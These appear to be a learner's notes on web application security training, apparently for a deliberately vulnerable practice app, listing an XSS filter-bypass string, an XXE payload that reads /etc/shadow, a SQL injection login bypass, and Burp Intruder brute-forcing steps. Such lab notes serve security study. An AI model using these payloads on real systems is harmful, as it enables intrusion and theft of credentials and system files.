[Web App Testing: Episode 3 - XSS, SQL Injection, and Broken Access Control](https://www.youtube.com/watch?v=azYwfI26oXo&list=PLLKT__MCUeixCoi2jtP2Jj8nZzM4MOzBL&index=3)

## xss bypass
```js
<<a|ascript>alert('xss')</script>
```

##  Deprecated Interface XXE injection
Use a deprecated B2B interface that was not properly shut down. XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
- search xxe payload
- look for POST requests
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&xxe;</lastName>
</userInfo>
```
### Extras
- [w3schools.com/xml](https://www.w3schools.com/xml/xml_dtd.asp)
- [XXE Lab Breakdown: Exploiting XXE using external entities to retrieve files](https://www.youtube.com/watch?v=71dZaGfOVqw)
- [How to search for XXE!](https://www.youtube.com/watch?v=0DQnWalxYb4)

## Password Strength  - password bruteforcing 
Log in with the administrator's user credentials without previously changing them or applying SQL Injection.
Need to finish before sql injection:
```sql
' OR 1=1;--
```
### after 
- burp intruder 
- add payload list 
- let it run


